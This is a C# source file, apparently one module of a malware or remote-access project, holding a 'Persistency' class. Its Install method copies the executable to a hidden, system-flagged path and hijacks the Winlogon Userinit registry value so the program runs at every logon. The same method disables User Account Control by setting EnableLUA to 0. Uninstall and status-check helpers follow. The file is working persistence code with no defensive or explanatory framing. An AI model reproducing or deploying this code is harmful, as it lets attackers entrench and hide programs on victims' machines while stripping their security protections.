using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System;

namespace Project.Classes
{
    public class Persistency
    {
        public static void Install()
        {
            File.Copy(Application.ExecutablePath, Settings.InstallPath);

            RegistryKey rk = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
            rk.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe, " + Settings.InstallPath + ",");

            rk = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
            rk.SetValue("EnableLUA", 0);

            rk.Close();
            File.SetAttributes(Settings.InstallPath, FileAttributes.Hidden | FileAttributes.System);
        }

        public static void Uninstall() {

            RegistryKey rk = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
            rk.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe,");

            rk = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
            rk.SetValue("EnableLUA", 1);

            rk.Close();
        }

        public static bool IsRunningInstalled()
        {
            if (Application.ExecutablePath == Settings.InstallPath)
                    return true;
            return false;
        }

        public static bool IsInstalled()
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            string userInit = (string)rk.GetValue("Userinit");
            if (userInit == "C:\\Windows\\system32\\userinit.exe, " + Settings.InstallPath + ",")
            {
                rk.Close();
                return true;
            }
            rk.Close();
            return false;
        }
    }
}